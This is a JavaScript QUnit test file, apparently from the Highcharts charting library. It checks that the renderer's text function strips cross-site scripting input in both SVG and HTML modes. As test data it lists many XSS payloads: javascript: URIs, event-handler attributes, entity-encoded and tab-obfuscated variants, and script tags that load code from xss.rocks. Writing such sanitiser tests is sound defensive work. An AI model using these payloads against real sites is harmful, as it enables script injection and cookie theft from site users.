QUnit.module('XSS', function () {
    [false, true].forEach(function (useHTML) {
        const x = !useHTML ? 10 : 300;
        const lineHeight = 18;
        let y = 0;
        let text;

        QUnit.test(`useHTML = ${useHTML}`, assert => {

            const ren = new Highcharts.Renderer(
                document.getElementById('container'),
                600,
                400
            );
            document.getElementById('container').style.position = 'relative';

            const realAlert = window.alert;
            window.alert = function () {
                assert.ok(false, 'Alert should not be called');
            };

            ren
                .text(
                    'This is a link to <a href="https://www.highcharts.com">highcharts.com</a>',
                    x,
                    y += lineHeight,
                    useHTML
                )
                .add();
            assert.strictEqual(
                document.getElementById('container').innerHTML.indexOf('onclick'),
                -1,
                'There should be no translation of anchors to onclick like historically'
            );


            text = ren
                .text(
                    `javascript:/*--></title></style></textarea><\/script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`,
                    x,
                    y += lineHeight,
                    useHTML
                )
                .add();
            assert.strictEqual(
                text.element.childNodes.length,
                1,
                'No nested nodes should be applied'
            );


            // JavaScript directive
            text = ren
                .text(
                    'This is a link to <a href="javascript:alert(\'XSS\')">an simple JS directive</a>, <br>' +
                    'an image <IMG SRC="javascript:alert(\'XSS\');">, <br>' +
                    'an unquoted image <IMG SRC=javascript:alert(\'XSS\')>, <br>' +
                    'a case insensitive attack vector <IMG SRC=JaVaScRiPt:alert(\'XSS\')>, <br>' +
                    'HTML entities <IMG SRC=javascript:alert(&quot;XSS&quot;)>, <br>' +
                    'grave accent obfuscation <IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
                    x,
                    y += lineHeight,
                    useHTML
                )
                .add();
            assert.ok(
                !/javascript/i.test(text.element.outerHTML),
                'JavaScript directive should be stripped out'
            );
            assert.ok(
                !/alert/i.test(text.element.outerHTML),
                'Alerts should be stripped out from JS directives'
            );

            // Malformed HTML
            text = ren
                .text(
                    [
                        '\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>',
                        '\<a onmouseover=alert(document.cookie)\>xxs link\</a\>',
                        '<IMG """><SCRIPT>alert("XSS")<\/SCRIPT>"\>',
                        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
                        '<IMG SRC=# onmouseover="alert(\'xxs\')">',
                        '<IMG SRC= onmouseover="alert(\'xxs\')">',
                        '<IMG onmouseover="alert(\'xxs\')">',
                        '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
                        '<<SCRIPT>alert("XSS");//\<<\/SCRIPT>',
                        '<SCRIPT SRC=http://xss.rocks/xss.js?< B >'
                    ].join(',<br>'),
                    x,
                    y += lineHeight,
                    useHTML
                )
                .add();
            assert.ok(
                !/javascript/i.test(text.element.outerHTML),
                'Malformed HTML, JS directives should be stripped out'
            );
            assert.ok(
                !/alert/i.test(text.element.outerHTML),
                'Malformed HTML, alerts should be stripped out from JS directives'
            );
            assert.ok(
                !/alert/i.test(text.element.outerHTML),
                'Malformed HTML, scripts should be stripped out from DOM'
            );

            // Character tricks
            text = ren
                .text(
                    [
                        '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
                        '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
                        '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
                        '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
                        // Embedded tab
                        '<IMG SRC="jav	ascript:alert(\'XSS\');">', // eslint-disable-line
                        '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">', // Embedded encoded tab
                        '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
                        '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
                        '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">'

                    ].join(',<br>'),
                    x,
                    y += lineHeight,
                    useHTML
                )
                .add();
            assert.ok(
                !/ on/i.test(text.element.outerHTML),
                'Character tricks, event attributes should be stripped'
            );
            assert.ok(
                !/javascript/i.test(text.element.outerHTML),
                'Character tricks, JS directives should be stripped out'
            );
            assert.ok(
                !/alert/i.test(text.element.outerHTML),
                'Character tricks, alerts should be stripped out from JS directives'
            );


            // Non-alpha-non-digit
            text = ren
                .text(
                    [
                        '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"><\/SCRIPT>',
                        '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>',
                        '<SCRIPT/SRC="http://xss.rocks/xss.js"><\/SCRIPT>'
                    ].join(',<br>'),
                    x,
                    y += lineHeight,
                    useHTML
                )
                .add();
            assert.ok(
                !/ on/i.test(text.element.outerHTML),
                'Non-alpha, event attributes should be stripped'
            );
            assert.ok(
                !/alert/i.test(text.element.outerHTML),
                'Non-alpha, alerts should be stripped out from JS directives'
            );
            assert.ok(
                !/alert/i.test(text.element.outerHTML),
                'Non-alpha, scripts should be stripped out from DOM'
            );


            // Tag tricks
            text = ren
                .text(
                    [
                        '<\/script><script>alert(\'XSS\');<\/script>',
                        '</TITLE><SCRIPT>alert("XSS");<\/SCRIPT>',
                        '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
                        '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
                        '<IMG DYNSRC="javascript:alert(\'XSS\')">',
                        '<IMG LOWSRC="javascript:alert(\'XSS\')">',
                        '<svg/onload=alert(\'XSS\')>',
                        '<BODY ONLOAD=alert(\'XSS\')>'
                    ].join(',<br>'),
                    x,
                    y += lineHeight,
                    useHTML
                )
                .add();
            assert.ok(
                !/ on/i.test(text.element.outerHTML),
                'Tag tricks, event attributes should be stripped'
            );
            assert.ok(
                !/alert/i.test(text.element.outerHTML),
                'Tag tricks, alerts should be stripped out from JS directives'
            );
            assert.ok(
                !/alert/i.test(text.element.outerHTML),
                'Tag tricks, scripts should be stripped out from DOM'
            );

            // Reset
            window.alert = realAlert;

        });

    });

});